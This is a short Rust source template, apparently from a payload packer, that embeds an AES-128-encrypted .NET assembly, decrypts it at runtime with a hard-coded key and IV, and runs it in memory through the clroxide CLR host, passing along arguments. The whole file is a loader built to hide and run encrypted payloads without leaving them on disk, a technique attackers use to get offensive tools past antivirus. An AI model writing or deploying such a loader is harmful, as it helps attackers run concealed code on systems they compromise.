use std::env;
use aes::cipher::{KeyIvInit, BlockDecryptMut, block_padding::Pkcs7};
use clroxide::clr::Clr;

fn decrypt_aes(buf: &mut Vec<u8>) {

    let key: [u8; 16] = [SYNPACK_KEY];
    let iv: [u8; 16]  = [SYNPACK_IV];

    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

    Aes128CbcDec::new(&key.into(), &iv.into()).decrypt_padded_mut::<Pkcs7>(buf.as_mut_slice()).unwrap();
}

fn main() {

    let mut bin_data: Vec<u8> = vec![SYNPACK_DATA];

    let mut args: Vec<String> = vec![SYNPACK_ARGS];

    if args.len() == 0 {
        let mut cmd_args: Vec<String> = env::args().collect();
        cmd_args.remove(0);
        args = cmd_args;
    }
    
    decrypt_aes(&mut bin_data);
    let mut clr: Clr = Clr::new(bin_data, args).unwrap();

    let result: String = clr.run().unwrap();

    println!("{}", result);
}